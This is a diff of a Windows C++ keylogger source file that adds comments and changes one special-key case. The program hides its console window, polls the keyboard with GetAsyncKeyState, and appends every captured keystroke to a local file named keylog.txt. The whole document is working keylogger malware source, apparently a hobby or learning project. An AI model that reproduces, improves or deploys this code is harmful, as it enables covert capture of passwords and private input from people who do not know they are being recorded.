@@ -1,12 +1,18 @@
-//This program records keystrokes in a text file  
+/*
+This program records keystrokes in a text file  
+*/
 
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
 #include <string>
-#include <fstream>
+#include <fstream> 
 #include <iostream>
 using namespace std;
 
+/*
+This function creates and opens a file called "keylog.txt".
+If the file is open, it starts writing the keystrokes to that file.
+*/
 
 void LOG(string keystroke)
 {
@@ -19,6 +25,11 @@ void LOG(string keystroke)
   }
 }
 
+/*
+This bool function is used for the special keys on a keyboard.
+If a special key is pressed, the program will refer back to the LOG function
+and it will record the special key that was pressed
+*/
 
 bool SpecialKeys(int S_key)
 {
@@ -76,9 +87,9 @@ bool SpecialKeys(int S_key)
 		cout << "#CONTROL";
 		LOG("#CONTROL");
 		return true;
-	case VK_ESCAPE:
-		cout << "#ESCAPE";
-		LOG("#ESCAPE");
+	case VK_OEM_7:
+		cout << "'";
+		LOG("'");
 		return true;
 	default: 
 		return false;
@@ -88,7 +99,7 @@ bool SpecialKeys(int S_key)
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
 	char key = 'a';
 
 	while (true)
@@ -97,13 +108,15 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
       			{
-				if (SpecialKeys(key) == false)
+				//Checks to see if a special key was pressed
+				if (SpecialKeys(key) == false) 
         			{
+					//If not, the program records the character key that was pressed
 					fstream logFile;
 					logFile.open("keylog.txt", fstream::app);
 					if (logFile.is_open())
           				{
-						logFile << char(key);
+						logFile << char(key); 
 						logFile.close();
 					}
 
